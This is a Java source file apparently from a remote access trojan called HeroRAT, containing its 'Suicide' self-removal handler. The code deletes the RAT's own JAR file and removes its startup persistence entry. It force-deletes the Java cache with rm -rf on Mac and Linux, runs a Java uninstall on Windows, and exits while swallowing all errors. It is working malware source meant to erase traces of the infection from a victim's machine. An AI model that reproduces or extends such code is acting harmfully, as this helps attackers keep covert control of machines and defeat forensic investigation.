package net.herorat.features.suicide;

import java.io.DataOutputStream;
import java.io.File;

import net.herorat.features.startup.Startup;


public class Suicide
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		try
		{
			File jarFile = new File(Suicide.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			while (!jarFile.delete());
			
			Startup.remove("name");
			
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("mac"))
			{
				Runtime.getRuntime().exec(new String[] { "rm", "-rf", System.getProperty("java.home") + "/Library/Caches/Java/cache" }).waitFor();
			}
			else if (os.contains("nux"))
			{
				// TODO
				Runtime.getRuntime().exec(new String[] { "rm", "-rf", System.getProperty("java.home") + "/Library/Caches/Java/cache" }).waitFor();
			}
			else if (os.contains("win"))
			{
				Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-uninstall" }).waitFor();
			}
			
			System.exit(0);
		}
		catch (Exception e) {}
	}
}